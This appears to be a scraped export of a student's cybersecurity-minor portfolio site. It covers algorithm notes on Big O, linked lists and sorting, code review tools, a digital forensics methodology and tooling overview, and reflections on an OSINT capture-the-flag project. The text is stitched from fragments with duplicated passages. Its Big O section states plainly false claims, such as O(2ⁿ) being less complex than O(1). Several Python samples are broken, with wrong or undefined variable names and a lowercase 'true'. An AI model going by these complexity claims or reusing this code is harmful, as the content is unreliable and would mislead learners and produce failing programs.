notation gives only an asymptotic upper bound, and not an asymptotically tight bound, we can make statements that at first blush seem incorrect, but are technically correct.\n\n<a href=\"/images/projects/minor/algorithm/big_o_notation.jpeg\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/algorithm/big_o_notation.jpeg\" alt=\"Big O noation\"/>\n</a>\n\n#### O(1) has the least complexity\n\nIf you can build an algorithm that solves the problem in O(1) notation, you are likely at your best possible solution. When the complexity of a scenario exceeds O(1), we can examine it by looking for its O(1/g(n)) equivalent. For instance, O(1/n) is more difficult than O(1/n2).\n\n#### O(log(n)) is more complex than O(1), but less complex than polynomials\n\nBecause sorting algorithms are frequently associated with divide and conquer algorithms, O(log(n)) is a desirable complexity to aim for. Because the square root function can be regarded a polynomial with an exponent of 0.5, O(log(n)) is less difficult than O(n).\n\n#### O(nˣ) Complexity of polynomials increases as the exponent increases\n\nFor example, O(n⁵) is more complex than O(n⁴). Due to the simplicity of it.\n\n#### O(2ⁿ) Exponentials have greater complexity than polynomials as long as the coefficients are positive multiples of n\n\nO(2ⁿ) is more complex than O(n⁹⁹), but O(2ⁿ) is actually less complex than O(1). We generally take 2 as base for exponentials and logarithms because things tends to be binary in Computer Science, but exponents can be changed by changing the coefficients. If not specified, the base for logarithms is assumed to be 2.\n\nyou can write a book about big o notation so much and so big is the subject but for more information I would just google the topic.  \n\n### Big-Ω (Big-Omega) notation\n\nWe might wish to declare that an algorithm takes at least a specific amount of time without specifying a maximum time. The Greek letter \"omega\" is used in big-Ω notation. We use big-Ω notation for **asymptotic lower bounds**, since it bounds the growth of the running time from below for large enough input sizes.\n\n# Lets begin\n\n## Basics\n\n### Arrays:\n\nPython = list = non type bound\n\nJava = array = type bound\n\n### Executions\n\nOperations on Data structures\n\n- Access and read values \n- Search for an arbitrary values \n- Insert values at any point into the structure \n- Delete values in the structure \n\nWe access the data in the array by using the index of the stored positions of the value. Every value in the array has its index with which you can locate it also called an address. The base index in most languages is 0 to n; space = n * m.  \n\n```python\nnew_list = [1, 2, 3]\nresult = new_list[0]\t# 1\nresult = new_list[10] \t# IndexError: list index out of range \n```\n\nYou cannot access an address index that is larger than your instantiated array size. This will always result in an index out of bound error.   \n\nLets now search for a value in our list with Linear search:\n\n```python\nif 1 in new_list : print(True)\n    \nfor n in new_list:\n    if n == 1:\n        print(True)\n        break\n```\n\nLets insert a new value in the array: there are two methods to do so one on linear runtime and on constant time Append. They're different in that insert linear will insert in every given index and append will add to the array. But it also depends on the language we use. \n\n```python\nnumbers = [] # Default 1 element can be inserted \nlen(numbers) # Will give 0 as answer \nnumbers.append(2)\nnumbers.append(200) # Will execute resize array \n\n```\n\nThe append function will only increase the when the index will hit size 0, 4, 8, 16, 25, 35, 46... and so on we call this amortized constant space complexity. \n\n```python\n# Big-O of K | K = Number of items we append\nnumbers = []\nnumbers.extend([4, 5, 6]) # Makes a serie of append calls\n```\n\n## Linked list \n\nEach data structure solves a particular problem. Arrays are particularly good at accessing/reading values that will happen in constant time. But arrays are pretty bad at inserting and deleting which both run at linear time. Linked lists on the other hand are somewhat better at this although it has some problems. They are trying to solve a problem that involves far more inserts and deletes than accessing. A linked list can be a better tool than an array.\n\nA linked list is a linear data structure where each element in the list is contained in a separate object called a node. A node models two pieces of information an individual item of the data we want to store and a reference to the next node in the list. The first node in the linked list is called the head of the list. While the last node is called the tail. The head and the tail nodes are special the list only maintains a reference to the head although in some implementations it keeps a reference to the tail as well. Every node other than the tail point to the next node in the list. But the tail doesn't point to anything this is how we know it's the end of the list. Nodes are what called self-referential objects. Linked lists usually come in two forms a singly linked list where each node stores a reference to the next node in the list or a doubly linked list where each node stores a reference to both the node before and after\n\n```python\nclass Node: \n    # An object for storing a single node of a linked list\n    # Models tow attributes - data and the link to the next node in the \t\tlist\n    \n    data = None # To hold on to the data we are storing\n    next_node = None # To point to the next node in the list\n    \n    def __init__(self, data):\n        self.data = data\n        \n    def __repr__(self):\n        return \"<Node data: %s>\" % self.data # ToString value\n    \nclass LinkedList:\n\t# Singly linked list\n  \n    def __init__(self):\n        self.head = None\n    \n    def is_empy(self):\n        return self.head == None\n    \n    def size(self):\n        # Return the number of nodes in the list \n        # Takes 0(n) / linear time\n        \n        current = self.head\n        count = 0\n        \n        while current:\n            count += 1\n            current = current.next_node\n        \n        return count\n\n  \tdef add(self, data):\n        # Adds new Node container data at head of the list\n        # Takes 0(1) time\n        \n        new_node = Node(data)\n        new_node.next_node = self.head\n        self.head = new_node\n        \n    def search(self, key):\n        # Search for the first node containing data that maches the key\n        # Return the node or 'None' if not found\n        # Takes 0(n) time\n        \n        current = self.head\n        \n        while current:\n            if current.data == key:\n                return current \n            else:\n                current = current.next_node\n                \n        return None\n    \n    def insert(self, data, index):\n        # Inserts a new Node containing data at index position \n        # Insertion takes 0(1) time but infing the node at the insertion point take 0(n time)\n        # Takes overal 0(n) time\n        \n        if index == 0 :\n            self.add(data)\n        \n        if index > 0:\n            new = Node(data)\n            \n            position = index \n            current = self.head\n            \n            while position > 1:\n                current = node.next_node\n                position -= 1 \n                \n            prev_node = current \n            next_node = current.next_node \n            \n            prev_node.next_node = new \n            new.next_node = next_node\n    \n    def remove(self, key):\n        # Removes Node containing data that matches the key\n        # Return the node of None if key doesn't exists\n        # Takes 0(n) time\n        \n        current = self.head\n        previous = None;\n        found = False\n        \n        while current and not found:\n            if current.data == key and current == self.head:\n                found = True\n                self.head = current.next_node\n            elif current.data == key:\n                found = True \n                previous.next_node = current.next_node\n            else:\n                previous = current\n                current = current.next_node\n                \n        return current     \n        \n    def node_at_index(self, index):\n        if index == 0:\n            return self.head\n        else:\n            current = self.head\n            position = 0\n        \n        while position < index:\n            current = current.next_node\n            possition += 1 \n        \n        return current\n        \n    def __repr__(self):\n        # Return a string representation of the list\n        # Takes 0(n) time\n        \n        nodes = []\n        current = self.head\n        \n        while current:\n            if current is self.head:\n                nodes.append(\"[Head: %s]\" % current.data)\n            elif current.next_node is None:\n                nodes.append(\"[Tail: %s]\" % current.data)\n            else:\n                nodes.append(\"[%s]\" % current.data)\n            \n            current = current.next_node\n       \treturn '-> '.join(nodes)\n\t\t \n        \n        \n# [Head],[],[],[],[Tail]\nl = LinkedList()\nl.add(1)\nl.size() # returns 1 \nl.add(2)\nl.add(3)\nl.size() # returns 3\n\nl # returns [Head: 3]-> [2]-> [Tail: 1]\n        \n```\n\nHead can be seen as the top of an book pile its the first book you pick from the pile. Unlike arrays where when you insert an element into the array all element after the particular index need to be shifted. With a linked list we just need to change the references to next on a few nodes. This way we can insert a node at any point in the list in constant time.\n\n## Merge sort\n\nMerge sort works like binary sort by splitting up the problem into sub problems. But it takes it one step further. In the first sequence we split the array into two smaller arrays on the second sequence we are going to split the first sequence again and so on until we are down to single element arrays. After that the merge sort algorithm works backwards. By repeatedly merging the single element arrays and sorting them at the same time.\n\nSolving a problem like this by recursively breaking down the problem into subparts until it is easily solvable is an algorithmic strategy called divide and conquer. \n\n```python\ndef merge_sort(list):\n    # Sorts a list in ascending order \n    # Return a new sorted list \n    \n    # Devide: Find the midpoint of the list and divide into sublists\n    # Conquer: Recursively sort the sublist created in previous step\n    # Combine: Merge the sorted sublists created in previous step \n    \n    # Takes O(kn log n) time\n    \n    if len(list) <= 1:\n        return list \n    \n    left_half, right_half = split(list)\n    \n    left = merge_sort(left_half)\n    right = merge_sort(right_half)\n    \n    return merge(left, right)\n\ndef split(list):\n    # Divide the unsorted list at midpoint into sublists\n    # Returns two sublists - left and right\n    \n    # Takes overal O(k log n) time\n    \n    min = len(list)//2\n    left = list[:mid] # list[0:mid]            Takes n of k \n    right = list[mid:] # list[mid:len(list)]\n    \n    return left, right\n\ndef merge(left, right):\n    # Merges two lists (arrays), sorting them in the process\n    # Return a new merged list\n    \n    # Runs in overal O(n) time\n    \n    l = []\n    i = 0\n    j = 0\n    \n    while i < len(left) and j < len(right):\n        if left[i] < right[j]:\n            l.append(left[i])\n            i += 1\n        elif left[i] >= right[j]:\n            l.append(right[j])\n            j += 1\n   \n    while i < len(left):\n        l.append(left[i])\n        i += 1 \n        \n    while j < len(right):\n        l.append(right[j])\n        j += 1\n     \n    return l\n\ndef verify_sorted(list):\n    n = len(list)\n    \n    # Stopping condition \n    if n == 0 or n == 1: \n        return true\n    \n    return list[0] < list[1] and verify_sorted(list[1:])\n \t# [1, 2, 3, 4, 5]\n    # [2, 3, 4, 5]\n    # [3, 4, 5]\n    # [4, 5]\n    # [5]\n\n        \nalist = [54, 62, 93, 17, 77, 31, 44, 55, 20]\nl = merge_sort(alist)\nprint(l) # Return [17, 20, 31, 44, 54, 62, 77, 93]\nprint(verify_sorted(alist)) # Return False\nprint(verify_sorted(l)) # Return True\n```\n\n### Linked list merge sort\n\n```python\nfrom linked_list import LinkedList\n\ndef merge_sort(linked_list):\n    # Sorts a linked list in ascending order\n    # -

Recursive functions are difficult to understand. The flow of control is quite complex.\n\n```python\n# Normal\ndef sum(numbers):\n    total = 0\n    for number in numbers:\n        total += number\n    return total\n\nprint(sum([1, 2, 7, 9]))\n```\n\n```python\n# Recursion\ndef sum(numbers):\n    if not numbers: \n        return 0 \n    print(\"Calling sum(%s)\" % numbers[1:])\n \tremaining_sum = sum(numbers[1:])\n    print(\"Call to sum(%s) returning %d + %d\" % (numbers, numbers[0], remaining_sum))\n    return numbers[0] + remaining_sum\n\nprint(sum([1, 2, 7, 9]))\n# Calling sum([2, 7, 9])\n# Calling sum([7, 9])\n# Calling sum([9])\n# Calling sum([])\n# Call sum([9]) returning 9 + 0\n# Call sum([7, 9]) returning 7 + 9\n# Call sum([2, 7, 9]) returning 2 + 16\n# Call sum([1, 2, 7, 9]) returning 1 + 18\n# Result: 19\n```\n\n## Quick Sort\n\nQuickSort is a Divide and Conquer algorithm. It picks an element as pivot and partitions the given array around the picked pivot. There are many different versions of quickSort that pick pivot in different ways. \n\nList: [4, 6, 3, 2, 9, 7, 3, 5]\n\n​\tPivot: [4]\n\n​\tLess than pivot: [3, 2, 3]  ->  [2, 3] [3] [ ]  ->  [ ] [2] [3] = [2, 3]  ->  [2, 3] [3] [ ]  ->  [2, 3, 3]\n\n​\tGreater than pivot: [6, 9, 7, 5] -> [5] [6] [9, 7]  ->  [5, 6, 7, 9]\n\n  [2, 3, 3, 4, 5, 6, 7, 9]\n\n```python\nimport sys\nfrom load import load_numbers\n\nnumbers = load_numbers(sys.argv[1])\n\ndef quicksort(values):\n    if len(values) <= 1:\n        return values \n    less_than_pivot = []\n    greater_than_pivot = []\n    pivot = value[0]\n    \n    for value in values[1:]:\n        if value <= pivot:\n            less_than_pivot.append(value)\n        else :\n            greater_than_pivot.append(value)\n    \n    print(\"%15s %1s %-15s\" % (less_than_pivot, pivot, greater_than_pivot))\n    return quicksort(less_than_pivot) + [pivot] + quicksort(greater_than_pivot)\n\nprint(numbers) \n# [4, 6, 3, 2, 9, 7, 3, 5]\nsorted_number = quicksort(numbers)\n# [3, 2, 3] 4 [6, 9, 7, 5]\n# \t [2, 3] 3 []\n#        [] 2 [3]\n#       [5] 6 [9, 7]\n#       [7] 9 []\nprint(sorted_numbers) \n# [2, 3, 3, 4, 5, 6, 7, 9]\n```\n\n## Selection sort\n\nAlso a bad sorting sorting algorithm. With each loop we will look through each of the values in the unsorted array and find the smallest value and move that value to the end of the sorted array. We start with the first value in the unsorted and say its the minimum or smallest value we have seen so far for now.

The analyses performed on my code are divided into several domains so is the cyber domain also one of them. \n\n<a href=\"/images/projects/minor/code-review/code-quality_qonarcloud.png\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/code-review/code-quality_qonarcloud.png\" alt=\"SonarCloud dashboard\"/>\n</a>\n\n#### Codacy\n\nCodacy automates code reviews and monitors code quality on every commit and pull request, reporting back on the impact of each commit or pull request, code style, best practices, security, and many other issues. It tracks changes in code coverage, duplication, and complexity. Saving developers' time during code reviews, allowing them to tackle technical debt more effectively. Currently, JavaScript, Java, Ruby, Scala, PHP, Python, CoffeeScript, and CSS are supported. Codacy is static analysis without the complication.\n\n<a href=\"/images/projects/minor/code-review/codacy.jpeg\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/code-review/codacy.jpeg\" alt=\"Codacy dashboard\"/>\n</a>\n\n\n\nSources:\n\n- [mitre](https://www.mitre.org/publications/systems-engineering-guide/enterprise-engineering/systems-engineering-for-mission-assurance/secure-code-review)\n- [mitre code review report](https://www.mitre.org/publications/all/sample-secure-code-review-report)\n\n","readingTime":"6 min read","meta":{"version":0,"revision":0,"created":1642431876804},"$loki":4},{"slug":"minor_digital-forensic-report","description":"A digital forensic report based on the Norton dataset","title":"digital forensics report","duration":"1 day","image":"/images/projects/minor/digital-forensics/digital-forensics.png","tech":[{"name":"digital forensics"},{"name":"report"}],"category":[{"name":"minor"},{"name":"cyber"},{"name":"body of knowledge"}],"author":{"name":"Rik Peeters","image":"/images/me.jpg","social":{"twitter":"rikp777"}},"createdAt":"2021-10-31T00:00:00.000Z","toc":[{"id":"abstract","depth":2,"text":"Abstract"},{"id":"case-background","depth":2,"text":"Case background"},{"id":"suspect-summary","depth":3,"text":"Suspect summary"},{"id":"standart-principles-and-criteria-followed","depth":2,"text":"Standart principles, and Criteria followed"},{"id":"general-principles","depth":3,"text":"General Principles"},{"id":"principles-and-procedures","depth":3,"text":"Principles and procedures"},{"id":"additional-guidance","depth":3,"text":"Additional guidance"}],"body":{"type":"root","children":[{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"a","props":{"href":"https://www.rnyte-cyber.com/uploads/9/8/5/9/98595764/exampledigiforensicsrprt_by_ryan_nye.pdf","rel":["nofollow","noopener","noreferrer"],"target":"_blank"},"children":[{"type":"text","value":"https://www.rnyte-cyber.com/uploads/9/8/5/9/98595764/exampledigiforensicsrprt_by_ryan_nye.pdf"}]}]},{"type":"text","value":"\n"},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"a","props":{"href":"https://www.peertechzpublications.com/articles/TCSIT-6-134.php","rel":["nofollow","noopener","noreferrer"],"target":"_blank"},"children":[{"type":"text","value":"https://www.peertechzpublications.com/articles/TCSIT-6-134.php"}]}]},{"type":"text","value":"\n"},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"a","props":{"href":"https://www.forensicfocus.com/articles/writing-dfir-reports-a-primer/","rel":["nofollow","noopener","noreferrer"],"target":"_blank"},"children":[{"type":"text","value":"https://www.forensicfocus.com/articles/writing-dfir-reports-a-primer/"}]}]},{"type":"text","value":"\n"},{"type":"element","tag":"h1","props":{"id":"digital-forensic-report"},"children":[{"type":"element","tag":"a","props":{"href":"#digital-forensic-report","ariaHidden":"true","tabIndex":-1},"children":[{"type":"element","tag":"span","props":{"className":["icon","icon-link"]},"children":[]}]},{"type":"text","value":"Digital forensic report"}]},{"type":"text","value":"\n"},{"type":"element","tag":"h2","props":{"id":"abstract"},"children":[{"type":"element","tag":"a","props":{"href":"#abstract","ariaHidden":"true","tabIndex":-1},"children":[{"type":"element","tag":"span","props":{"className":["icon","icon-link"]},"children":[]}]},{"type":"text","value":"Abstract"}]},{"type":"text","value":"\n"},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"The purpose of this report is to provide evidence in the case of the Eron corporation fraud.

Digital forensics is the process of uncovering and interpreting electronic data. The goal of the process is to preserve evidence in its most original form while conducting a structured investigation by collecting, identifying and validating the digital information to reconstruct past events. The context is usually the use of data in a court of law, although digital forensics can be used in other cases as well.\n\n## Forensic methodologies and practices\nForensic investigations always go through set steps. \nIn some cases, not all steps are necessary to capture evidence. Then simply validation and identification is enough of a dataset.\nThe main elements of computer forensics are listed below:\n\n- The use of scientific method\n- Collection and preservation of data\n- Validation\n- Identification\n- Analysis and interpretation (machine learning / statistics)\n- Documentation and presentation\n\nDifferent law enforcement agencies can only work together effectively if they communicate clearly with each other. The investigative team must keep the whole picture in mind and be clear when referring to specific components. It is fundamental that everyone understands whether a case only needs to be prepared, extracted and identified, or whether it also needs to be analyzed.\n\n## Preparation/Extraction\nWhen the investigator's forensic platform is complete, he or she duplicates the forensic data provided in the request and verifies its integrity. This process assumes that law enforcement has already obtained the data through an appropriate legal process and created a forensic image.\n\nAfter the investigators have verified the integrity of the data to be analyzed, they develop a plan to extract the data. They organize and refine the forensic request into questions they understand and can answer. The forensic tools that allow them to answer these questions are selected. \nInvestigators generally have preliminary ideas about what to look for based on the request. \nThey add these to a \"Search Lead List,\" which is a running list of requested items. For example, \nthe request may have as a guideline \"search for child pornography.\" Investigators explicitly create a list of leads to help focus the investigation. As they develop new leads, they add them to the list, and as they exhaust the leads, they mark them as \"processed\" or \"done.\"\n\nSo before I begin extracting the given I have a goal in mind. \n\n## Identification\nInvestigators shall repeat the identification process for each item on the extracted list.\nIf an investigator finds an item that is incriminating but beyond the scope of the original search warrant, the investigator should immediately cease all activity, notify the appropriate persons, including the requester, and await further instructions. For example, law enforcement may seize a computer for evidence of tax fraud, but the investigator may find an image of child pornography.\n\n## Analysis \nIn the analysis phase, the researchers connect all the items and paint a complete picture for the applicant. For each item on the list of relevant data, the researchers answer questions such as who, what, when, where, and how. They try to explain which user or application created, edited, received or sent each item, and how it was originally created. Researchers also explain where they found it. Most importantly, they explain why all this information is important and what it means to the case.\n\n## Documenting and Reporting\n\nComputer forensic investigators must keep an accurate record of all activity related to the investigation, including all methods used for testing system functionality and retrieving, copying, and storing data, as well as all actions taken to acquire, examine, and assess evidence, in addition to fully documenting information related to hardware and software specs. This not only demonstrates how the integrity of user data has been kept, but it also confirms that all parties have followed relevant policies and processes. Because the entire procedure is designed to collect facts that may be used as evidence in a court of law, an investigator's inability to accurately document his or her findings is a major red flag.\n\n\n\n## History \n\nLooking back on the history of digital forensics, it's clear that law enforcement at the time had just a rudimentary understanding of how to apply digital forensic procedures. During the 1970s and 1980s, however, the forensics team was largely made up of members of federal law enforcement organizations with a background in computers. Because most paperwork is done digitally, the first area of concern for law enforcement was data storage. Seizing, keeping, and examining the documents was undeniably a time-consuming task for the authorities. In response to this, the FBI developed the Magnet Media program, the first formal digital forensics program, in 1984.\n\nOther strategies for detecting cybercriminals who break into computer systems were developed as a result. The first honeypot trap was invented in 1986 by Cliff Stoll, a Unix System Administrator at Lawrence Berkeley National Laboratory. Due to the proliferation of child pornography on the internet, digital forensics grew in popularity.\n\n## In action\n\nAs you can imagine, ethics are also very important within this profession. You have to work independently without prejudice. For this, you must therefore obtain a certificate to ensure your ethical conduct. Having a degree in criminal justice, psychology, engineering, biology or any other field with no certificates does not mean you’ll never get a job.\n\n### Certifications\n\nSome well-known forensic certifications include the following:\n\n- CISA – Certified Information Systems Auditor\n- CISSP – Certified Information Systems Security Professional\n- CCE – Certified Computer Examiner\n- CFCE – Certified Forensic Computer Examiner\n- GIAC – Global Information Assurance Certification\n  - GIAC Certified Forensic Analyst (GCFA)\n  - GIAC Advanced Smartphone Forensics (GASF)\n  - GIAC Certified Forensic Examiner (GCFE)\n  - GIAC Network Forensic Analyst (GNFA)\n  - GIAC Reverse Engineering Malware (GREM)\n  - GIAC Security Essentials (GSEC)\n\nForensic Software Vendor Training and Certificates can also be beneficial.  Some examples include:\n\n- ACE – AccessData Certified Examiner\n- BelkaCE – Belkasoft\n- EnCE – EnCase Certified Engineer\n- Cellebrite\n  - Cellebrite Certified Operator (CCO)\n  - Cellebrite Certified Physical Analyst (CCPA)\n  - Cellebrite Certified Mobile Examiner (CCME)\n- XRY – XRY Certification\n- X-PERT – X-Ways Professional in Evidence Recovery Techniques\n- BlackBag Technologies\n  - Certified Blacklight Examiner (CBE)\n  - Certified Mobilyze Operator (CMO)\n  - Mac and iOS Certified Forensic Examiner (MICFE)\n\nOther certificates you may also consider, that provide a more general computer foundation are:\n\n- CompTIA A+\n- CompTIA Network+\n- CompTIA Security+\n\nCertification courses are typically short courses, often less than 10 classes.\n\nEach certification course has their own requirements and can include professional time spent in a forensics related field.\n\nIt’s best to research each certification you’re planning to take to ensure you meet the requirements before deciding to take it.\n\n### Tooling\n\nIn the 1990s, digital investigations were conducted utilizing live analysis, and it was usual practice to review digital media using the device in question. With the growing use of devices capable of storing massive volumes of data, live analysis became inefficient. Digital forensic tools were eventually developed to examine data on a device without causing it any harm. Digital forensic tools are currently divided into three categories: open source digital forensic tools, hardware digital forensic tools, and others. Most common tooling today are the following\n\n- Sleuth Kit (+Autopsy)\n  - Sleuth Kit (+Autopsy) is a Windows-based utility program that simplifies computer forensic analysis. You may use this tool to inspect your hard disk and smartphone.\n- CAINE\n  - CAINE is an Ubuntu-based program that provides a graphical interface to a complete forensic environment. As a module, this tool can be integrated into current software solutions. It creates a chronology from RAM on its own.\n- PALADIN\n  - CAINE is an Ubuntu-based program that provides a graphical interface to a complete forensic environment. As a module, this tool can be integrated into current software solutions. It creates a chronology from RAM on its own.\n- EnCase\n  - Encase is an application that helps you to recover evidence from hard drives. It allows you to conduct an in-depth analysis of files to collect proof like documents, pictures, etc.\n- Wireshark\n  - Wireshark is a tool that analyzes a network packet. It can be used to for network testing and troubleshooting.

It can safeguard evidence and generate high-quality reports for use in judicial proceedings. EXIF (Exchangeable Image File Format) information can be extracted from JPEG files with this utility.\n\nBut for each solution, you can also find lots of scripts online that were created for specific purposes and made public by the analyst for others to use in their research as well \n\nHere are the main types of digital forensic tools:\n\n- Disk Forensic Tools\n  - SSD\n  - Hard drive \n- Network Forensic Tools\n- Wireless Forensic Tools\n- Database Forensic Tools\n- Malware Forensic Tools\n- Email Forensic Tools\n- Memory Forensic Tools\n- Mobile Phone Forensic Tools\n\nAs you can see, there are a whole bunch of subdomains that forensic analysis can be done on.

Some examples include:\n\n- ACE – AccessData Certified Examiner\n- BelkaCE – Belkasoft\n- EnCE – EnCase Certified Engineer\n- Cellebrite\n  - Cellebrite Certified Operator (CCO)\n  - Cellebrite Certified Physical Analyst (CCPA)\n  - Cellebrite Certified Mobile Examiner (CCME)\n- XRY – XRY Certification\n- X-PERT – X-Ways Professional in Evidence Recovery Techniques\n- BlackBag Technologies\n  - Certified Blacklight Examiner (CBE)\n  - Certified Mobilyze Operator (CMO)\n  - Mac and iOS Certified Forensic Examiner (MICFE)\n\nOther certificates you may also consider, that provide a more general computer foundation are:\n\n- CompTIA A+\n- CompTIA Network+\n- CompTIA Security+\n\nCertification courses are typically short courses, often less than 10 classes.\n\nEach certification course has their own requirements and can include professional time spent in a forensics related field.\n\nIt’s best to research each certification you’re planning to take to ensure you meet the requirements before deciding to take it.\n\n### Tooling\n\nIn the 1990s, digital investigations were conducted utilizing live analysis, and it was usual practice to review digital media using the device in question. With the growing use of devices capable of storing massive volumes of data, live analysis became inefficient. Digital forensic tools were eventually developed to examine data on a device without causing it any harm. Digital forensic tools are currently divided into three categories: open source digital forensic tools, hardware digital forensic tools, and others. Most common tooling today are the following\n\n- Sleuth Kit (+Autopsy)\n  - Sleuth Kit (+Autopsy) is a Windows-based utility program that simplifies computer forensic analysis. You may use this tool to inspect your hard disk and smartphone.\n- CAINE\n  - CAINE is an Ubuntu-based program that provides a graphical interface to a complete forensic environment. As a module, this tool can be integrated into current software solutions. It creates a chronology from RAM on its own.\n- PALADIN\n  - CAINE is an Ubuntu-based program that provides a graphical interface to a complete forensic environment. As a module, this tool can be integrated into current software solutions. It creates a chronology from RAM on its own.\n- EnCase\n  - Encase is an application that helps you to recover evidence from hard drives. It allows you to conduct an in-depth analysis of files to collect proof like documents, pictures, etc.\n- Wireshark\n  - Wireshark is a tool that analyzes a network packet. It can be used to for network testing and troubleshooting. This tool helps you to check different traffic going through your computer system.\n- ProDiscover Forensic\n  - ProDiscover Forensic is a computer security program that helps you to find all of the data on a hard drive. It can safeguard evidence and generate high-quality reports for use in judicial proceedings. EXIF (Exchangeable Image File Format) information can be extracted from JPEG files with this utility.\n\nBut for each solution, you can also find lots of scripts online that were created for specific purposes and made public by the analyst for others to use in their research as well \n\nHere are the main types of digital forensic tools:\n\n- Disk Forensic Tools\n  - SSD\n  - Hard drive \n- Network Forensic Tools\n- Wireless Forensic Tools\n- Database Forensic Tools\n- Malware Forensic Tools\n- Email Forensic Tools\n- Memory Forensic Tools\n- Mobile Phone Forensic Tools\n\nAs you can see, there are a whole bunch of subdomains that forensic analysis can be done on. Each domain has its own tooling to achieve the desired result. on each domain you can apply your own methods to get to the desired result for example I apply machine learning in my own project. \n\n***\nResource: \n- [computer forensics digital forensic analysis methodology](https://www.crime-scene-investigator.net/computer-forensics-digital-forensic-analysis-methodology.html)\n\n- [online.norwich.edu](https://online.norwich.edu/academic-programs/resources/5-steps-for-conducting-computer-forensics-investigations)\n- [encouncil.org](https://www.eccouncil.org/what-is-digital-forensics/)\n\n","readingTime":"8 min read","meta":{"version":0,"revision":0,"created":1642431876881},"$loki":6},{"slug":"minor_ethics-data-science","description":"What standards and values are involved in analyzing data.

The idea is to develop a CTF environment where students and government students can gain knowledge on how to use OSINT and what the possibilities and dangers are. At Fontys, government trainees and students come to learn what OSINT is all about. To keep this topic interesting, a fun and interactive way to demonstrate OSINT must be found.

It was also allowed to combined different aspects within the cyber atmosphere. I did a lot of side projects that interested me I learned a lot about all of them and besides you really benefit if you are free in what you want to learn because you only learn what you are interested in.

We will focus on 3 aspects as described in the Cyber course. I will describe each learning objective briefly and give an evaluation. I will also talk about the group project and the tasks that we made within this group. I will also briefly show my peer assessment results as I have been assessed by my group members. In the conclusion, a reflection about all assignments is written; how it went and what could be better etc. \n\n## LO1 – Digital forensics \n\nMy specialization that I chose for this minor is Digital Forensics. This specialization is about collecting digital evidence that can show that an organization or person has performed things in a digital environment that are not acceptable. During this specialization route, I am going to look at ethical issues and the different possibilities within this specialization. I will also look at how tooling is used within an investigation. I will also shift my focus to the field of machine-learning and its applications within the cyber aspect. \n\nWhat a digital forensic does exactly can be read in my portfolio. Herein, I map out different topics and techniques. \n\n### Learning activies\n\n| Task                                             | Status | Pre-knowledge         |\n| ------------------------------------------------ | ------ | --------------------- |\n| Machine-learning Enron Dataset                   | Done   | None                  |\n| Machine-learning Gibbarish                       | Done   | None                  |\n| Machine-learning seclab                          | Done   | None                  |\n| Statistics formula’s                             | Done   | None                  |\n| Statistical research                             | Done   | None                  |\n| Captcha  mechanism                               | Done   | Some prior  knowledge |\n| Digital forensics methodology                    | Done   | None                  |\n| Course code cyber analysis (Secure code  review) | Done   | Prior  knowledge      |\n| Regular expressions “Regex” evil “Regex”         | Done   | Some prior  knowledge |\n| OSINT                                            | Busy   | None                  |\n| GDPR FDA 21 CFR Part 11                          | Busy   | Prior  knowledge      |\n| Pentest Methodology                              | Done   | Prior  knowledge      |\n| Own a linux system                               | Done   | None                  |\n| Algorithms                                       | Done   | Prior knowledge       |\n\n### Technical learning activities\n\nFor machine learning aspect I had to make a model that would detect so-called gibberish. This was part of a statistical research project where I was looking for a correlation between malicious URL's and gibberish. Since there was no open source model that would detect gibberish I had to make one myself. This was a challenge but I managed to make it work. After I got the model working I was able to write my research document for my statistical course. So these courses are connected to each other and have a cyber aspect to them. I also did some side project to further broaden my knowledge about other topics relating to cyber.  \n\n### Nontechnical learning activities\n\nThe non-technical learning activities are methodologies about different aspects within the Cyber security atmosphere. I also did some ethical research on topics of my interest. This gave me a broad view of what I can and can not do within my professional field.\n\n### Conclusion \n\nAs of now I have gained knowlegde in a number of technical learning objectives. I made this measurable by documenting the steps I took to get to my learning objectives. Before this, I did not have any prior knowledge in any of these topics so I have gained most of my knowledge during the execution of the assignments. It is fair to say that I have created a steady basis for myself to build up more knowledge regarding cyber related aspects.  \n\n## LO2\n\nThis chapter will address how I personally developed within the group project. In doing so, I will talk about the research and tasks I have made within the OSINT Project. I will also talk briefly about the communication within the group and the meetings with both the group members and stakeholders. \n\n### Project setting\n\nOSINT is an important part of the current state of the world. With OSINT, you can find a lot of information that is publicly known. Think about news websites, articles, social media and so on. Since Fontys wants to make their students more familiar with OSINT and the dangers and possibilities of it, we set up this project plan. The idea is to develop a CTF environment where students and government students can gain knowledge on how to use OSINT and what the possibilities and dangers are. At Fontys, government trainees and students come to learn what OSINT is all about. To keep this topic interesting, a fun and interactive way to demonstrate OSINT must be found. One way to accomplish this is a CTF related to OSINT. Capture the flags are a fun and interactive way to accomplish this.  \nThe goal is to develop a running, stable and reachable CTF system. Users should be able to play challenges independently and these challenges should have a storyline/goal. Challenges are exercises that a user will have to perform in order to learn more about OSINT. Challenges should be fun and encouraging in order to motivate users to learn more. We also need to describe ethics and scenarios. With scenarios you can think of the Bellingcat and MH17 example. In challenges, users learn what tooling is applied, when it is applied and what tooling is available.\n\n### Contribution\n\nI was the scrum leader during the definition phase of the project. This meant that I was the first to define the tasks within the group and then assign them. I also have a big role within the creation of challenges within our platform. In doing so, I made sure that there was a set format and a set theme. The theme has to do with aliens who try to infiltrate our society. It is up to the trainee to track down these aliens. I have also contributed to the research within our group by helping to formulate the research questions and applying the .dot framework. I also made sure there was good communication within the group so that everyone knows what they are doing and the other way around. During the final sprint we showed all our challenges within our platform. We did this as a group in the form of a workshop with other students. These students gave feedback about our final challenges. After that we transformed the two group project is to one whole platform with combined challenges from both groups. \n\n### Conclusion \n\nFinally, in terms of my growth as an innovator, I have had experience expressing my ideas in the early stages of project development and sharing them with my colleagues. In addition, I have interacted with clients through interviews, meetings, a presentation, and reports.\n\n## LO3\n\nThis chapter will focus on a peer review of my project skills and feedback from my coach, stakeholders, and other external sources. It will also review and analyze things as well as my contributions to professional writing and communication tasks which include presenting, interviewing, relationship management and advising. It will also cover the ethical aspects of my professional development as a security professional.\n\n### Peerassement (1)\n\nBelow are the points that can be seen as given by my teammates within my project group.

